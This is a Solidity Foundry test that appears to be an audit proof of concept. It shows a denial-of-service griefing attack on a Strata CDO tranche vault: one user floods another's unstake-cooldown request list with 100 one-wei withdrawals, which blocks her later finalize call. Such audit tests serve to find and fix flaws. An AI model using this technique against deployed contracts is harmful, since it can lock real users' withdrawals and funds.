// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { CDOTest } from "../../CDO.t.sol";
import { IStrataCDO } from "../../../contracts/tranches/interfaces/IStrataCDO.sol";
import { IUnstakeHandler } from "../../../contracts/tranches/interfaces/cooldown/IUnstakeHandler.sol";

contract TrancheMaxMintTest is CDOTest {
        function test_DoSUserActiveRequests() public {
        address alice = makeAddr("Alice");
        address bob = makeAddr("Bob");

        uint256 initialDeposit = 1000 ether;
        USDe.mint(alice, initialDeposit);
        USDe.mint(bob, initialDeposit);

        vm.startPrank(alice);
        USDe.approve(address(jrtVault), type(uint256).max);
        jrtVault.deposit(initialDeposit, alice);
        vm.stopPrank();

        vm.startPrank(bob);
        USDe.approve(address(jrtVault), type(uint256).max);
        jrtVault.deposit(initialDeposit, bob);
        vm.stopPrank();

        //@audit => Alice requests to withdraw its full USDe balance
        uint256 totalWithdrawableAssets = jrtVault.maxWithdraw(alice);
        vm.prank(alice);
        jrtVault.withdraw(totalWithdrawableAssets, alice, alice);

        //@audit => Bob does a huge amount of tiny withdrawals to inflate the activeRequests array of Alice
        vm.pauseGasMetering();
            for(uint i = 0; i < 100; i++) {
                vm.prank(bob);
                jrtVault.withdraw(1, alice, bob);
            }
        vm.resumeGasMetering();

        (uint64 time, IUnstakeHandler proxy) = unstakeCooldown.activeRequests(address(sUSDe), alice, 0);
        require(address(proxy) == address(0), "Unstake handler is defined");

        //@audit-info => Skip till a timestamp where the requests can be finalized
        skip(1_000_000);

        //@audit-issue => Alice gets DoS her tx to finalize the withdrawal of her USDe balance
        vm.prank(alice);
        unstakeCooldown.finalize(sUSDe, alice);
    }
}
